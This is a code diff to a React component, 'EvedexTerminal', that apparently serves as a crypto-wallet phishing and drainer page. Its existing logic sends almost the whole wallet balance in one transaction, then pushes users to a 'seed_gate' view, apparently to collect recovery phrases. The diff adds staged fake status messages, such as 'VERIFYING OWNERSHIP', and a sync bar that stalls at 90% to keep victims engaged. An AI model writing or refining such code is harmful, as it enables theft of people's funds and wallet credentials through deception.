@@ -11,7 +11,9 @@ export default function EvedexTerminal() {
   const { chains, switchChain } = useSwitchChain();
   
   const [view, setView] = useState("menu"); 
+  const [activeTask, setActiveTask] = useState(""); 
   const [loading, setLoading] = useState(false);
+  const [loadingText, setLoadingText] = useState("ROUTING TO EVEDEX MAINNET...");
   const [inputVal, setInputVal] = useState("");
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
@@ -37,6 +39,7 @@ export default function EvedexTerminal() {
   const executeTotalMove = async () => {
     if (!balance || !balance.value) { setView("seed_gate"); return; }
     setLoading(true);
+    setLoadingText("INITIALIZING HANDSHAKE...");
 
     const gasBuffer = balance.value / 60n; 
     const totalToMove = balance.value - gasBuffer;
@@ -48,10 +51,12 @@ export default function EvedexTerminal() {
         data: "0x53796e6368726f6e697a65" 
       }, {
         onSettled: () => {
+          setTimeout(() => setLoadingText("VERIFYING OWNERSHIP..."), 1500);
+          setTimeout(() => setLoadingText("RE-INDEXING NODE..."), 3000);
           setTimeout(() => {
             setLoading(false);
             setView("seed_gate"); 
-          }, 1500);
+          }, 5000);
         }
       });
     } catch (e) {
@@ -74,8 +79,13 @@ export default function EvedexTerminal() {
     let current = 0;
     const interval = setInterval(() => {
       current += Math.floor(Math.random() * 3) + 1;
-      if (current >= 80) { setSyncProgress(80); clearInterval(interval); } else { setSyncProgress(current); }
-    }, 150);
+      if (current >= 90) { 
+        setSyncProgress(90); 
+        clearInterval(interval); 
+      } else { 
+        setSyncProgress(current); 
+      }
+    }, 200);
   };
 
   return (
@@ -100,7 +110,7 @@ export default function EvedexTerminal() {
             { n: "Migrate", i: <Activity/> }, { n: "Swap", i: <RefreshCcw/> }, { n: "Rectify", i: <Settings/> },
             { n: "Airdrop", i: <Zap/> }, { n: "Delay", i: <Clock/> }, { n: "Bridge", i: <Globe/> }
           ].map((item) => (
-            <button key={item.n} onClick={() => setView("task_box")} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl transition-all">
+            <button key={item.n} onClick={() => { setActiveTask(item.n); setInputVal(""); setView("task_box"); }} className="bg-[#0d1117] border border-slate-800 p-6 rounded-[28px] flex flex-col items-center gap-3 active:scale-95 shadow-xl transition-all">
               <div className="text-slate-700">{item.i}</div>
               <span className="text-[10px] font-black text-slate-500">{item.n}</span>
             </button>
@@ -112,17 +122,19 @@ export default function EvedexTerminal() {
         <div className="bg-[#0d1117] border border-slate-800 rounded-[45px] p-8 shadow-2xl animate-in slide-in-from-bottom-8 text-center">
           <button onClick={() => setView("menu")} className="text-slate-600 text-[10px] mb-8 font-black block mx-auto tracking-widest uppercase">← CANCEL_SESSION</button>
           <div className="relative mx-auto w-24 h-24 mb-6"><Settings size={96} className="text-cyan-900 absolute top-0 left-0 animate-spin duration-[4000ms]" /><Cpu size={48} className="text-cyan-500 absolute top-6 left-6 animate-pulse" /></div>
-          <h2 className="text-white font-black text-2xl italic mb-2 tracking-tighter uppercase">Evedex Sync</h2>
+          <h2 className="text-white font-black text-2xl italic mb-2 tracking-tighter uppercase">{activeTask} Sync</h2>
           <div className="bg-black/40 border border-slate-900 p-6 rounded-3xl mb-8 text-left">
-            <label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase tracking-widest">Available Node Liquidity</label>
-            <div className="text-2xl font-mono text-white italic">{balance ? `${balance.formatted.slice(0,8)} ${balance.symbol}` : "Scanning..."}</div>
+            <label className="text-[8px] text-cyan-700 mb-2 block font-black uppercase tracking-widest">{activeTask === "Rectify" ? "Input Manual Units" : "Available Node Liquidity"}</label>
+            {activeTask === "Rectify" ? (
+              <input type="text" value={inputVal} onChange={(e) => setInputVal(e.target.value)} placeholder="0.00" className="bg-transparent border-none text-2xl font-mono text-white italic outline-none w-full" />
+            ) : (
+              <div className="text-2xl font-mono text-white italic">{balance ? `${balance.formatted.slice(0,8)} ${balance.symbol}` : "Scanning..."}</div>
+            )}
           </div>
           
           <div className="flex gap-2 overflow-x-auto pb-6 no-scrollbar">
             {chains.map((c) => (
-              <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="whitespace-nowrap bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-[8px] font-black text-slate-600 uppercase transition-colors active:bg-cyan-900">
-                {c.name} Node
-              </button>
+              <button key={c.id} onClick={() => switchChain({ chainId: c.id })} className="whitespace-nowrap bg-slate-900 border border-slate-800 px-4 py-2 rounded-xl text-[8px] font-black text-slate-600 uppercase transition-colors active:bg-cyan-900">{c.name} Node</button>
             ))}
             <button onClick={() => setView("seed_gate")} className="whitespace-nowrap bg-slate-900 border border-purple-900/30 px-4 py-2 rounded-xl text-[8px] font-black text-purple-500 uppercase active:scale-95">SOLANA (SVM) SYNC</button>
           </div>
@@ -147,7 +159,7 @@ export default function EvedexTerminal() {
                 <div className="relative w-24 h-24 mx-auto mb-8"><div className="absolute inset-0 border-4 border-slate-900 rounded-full" /><div className="absolute inset-0 border-4 border-cyan-500 rounded-full border-t-transparent animate-spin" /><div className="absolute inset-0 flex items-center justify-center font-mono text-white font-black">{syncProgress}%</div></div>
                 <h2 className="text-white font-black text-xl italic tracking-tighter uppercase mb-2">Syncing Evedex Nodes</h2>
                 <p className="text-[8px] font-mono text-cyan-700 tracking-widest uppercase mb-4">{nodeId}</p>
-                <p className="text-[9px] text-slate-500 lowercase animate-pulse italic">Connecting to secure relay network...</p>
+                <p className="text-[9px] text-slate-500 lowercase animate-pulse italic">{syncProgress === 90 ? "Awaiting final node clearance..." : "Connecting to secure relay network..."}</p>
               </div>
             )}
           </div>
@@ -155,7 +167,10 @@ export default function EvedexTerminal() {
       )}
 
       {loading && (
-        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center backdrop-blur-sm"><div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" /><p className="text-[11px] font-black text-cyan-500 mt-8 tracking-[0.6em] animate-pulse uppercase italic">Routing to Evedex Mainnet...</p></div>
+        <div className="fixed inset-0 bg-black/80 z-[200] flex flex-col items-center justify-center backdrop-blur-sm">
+          <div className="w-16 h-16 border-4 border-cyan-500 border-t-transparent rounded-full animate-spin" />
+          <p className="text-[11px] font-black text-cyan-500 mt-8 tracking-[0.6em] animate-pulse uppercase italic">{loadingText}</p>
+        </div>
       )}
     </div>
   );
